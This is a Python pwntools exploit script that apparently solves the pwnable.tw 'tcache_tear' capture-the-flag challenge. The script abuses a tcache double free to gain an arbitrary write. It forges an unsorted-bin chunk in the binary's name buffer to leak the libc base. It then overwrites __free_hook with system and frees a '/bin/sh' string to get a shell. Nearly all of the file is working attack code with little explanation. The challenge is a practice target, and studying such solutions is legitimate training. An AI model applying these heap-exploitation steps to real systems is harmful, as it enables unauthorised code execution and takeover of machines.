#!/usr/bin/env python3

from pwn import *

QWORD = 8
HEAP_HDR = 0x10
A,M,P = 4,2,1
context.terminal = ['tmux', 'splitw', '-h']

class Advasary:
    def __init__(self):
        self.libc = ELF('given/libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')
        self.elf = ELF('pwninit/tcache_tear_patched')

    def conn(self):
        if args.REMOTE:
            return remote('chall.pwnable.tw', 10207)

        ld = ELF('pwninit/ld-2.27.so')
        p = process([ld.path, self.elf.path], env={
            'LD_PRELOAD': self.libc.path
        })
        if args.GDB:
            gdb.attach(p, '\n'.join([
                'b *0x400c54', # free
                'b *0x400c70', # exit
            ]))
        return p

    def malloc(self, size: int, data: bytes):
        self.p.sendlineafter(b'Your choice :', b'1')
        self.p.sendlineafter(b'Size:', str(size).encode())
        self.p.sendafter(b'Data:', data)

    def free(self):
        self.p.sendlineafter(b'Your choice :', b'2')

    def print_name_buffer(self):
        self.p.sendlineafter(b'Your choice :', b'3')
        self.p.recvuntil(b'Name :')
        return self.p.recvn(0x20)

    def tcache_poisoning(self, addr: int, data: bytes, cache_size: int):
        '''An arbitrary write primitive'''
        self.malloc(cache_size, p64(addr))
        self.free()
        self.free()
        self.malloc(cache_size, p64(addr))
        self.malloc(cache_size, b'dummy')
        self.malloc(cache_size, data)

    def exploit(self):
        self.p = self.conn()

        # The first name buffer is useless
        self.p.sendafter(b'Name:', b'a' * 0x20)

        # we will plan a unsorted-bin buffer on
        unsortedbin_size = 0x500
        unsortedbin_chunk_hdr = [p64(0), p64(unsortedbin_size | P)]
        next_chunk = [p64(0), p64(0x20 | P),
                      p64(0), p64(0), p64(0x20), p64(0x30 | P)]

        # Write the next_chunk first
        dat_name_buffer = 0x602060
        dat_heap_ptr = 0x602088
        self.tcache_poisoning(
            addr=dat_name_buffer + 0x500 - HEAP_HDR,
            data=b''.join(next_chunk),
            cache_size=0x50,
        )

        # Write the unsortedbin_chunk
        offset = dat_heap_ptr - (dat_name_buffer - HEAP_HDR)
        payload = b''.join(unsortedbin_chunk_hdr).ljust(offset, b'\x00')
        payload += p64(dat_name_buffer)
        self.tcache_poisoning(
            addr=dat_name_buffer - HEAP_HDR,
            data=payload,
            cache_size=0x60,
        )

        self.free()
        leak = self.print_name_buffer()
        libc_leak = u64(leak[:8])
        log.info(f'libc leak: {hex(libc_leak)}')
        self.libc.address = libc_leak - 0x3ebca0
        log.info(f'libc base: {hex(self.libc.address)}')

        # hijacking: free -> system
        self.tcache_poisoning(
            addr=self.libc.sym['__free_hook'],
            data=p64(self.libc.sym['system']),
            cache_size=0x70
        )

        self.malloc(0x20, b'/bin/sh\x00')
        self.free()

        self.p.interactive()



if __name__ == '__main__':
    adv = Advasary()
    adv.exploit()
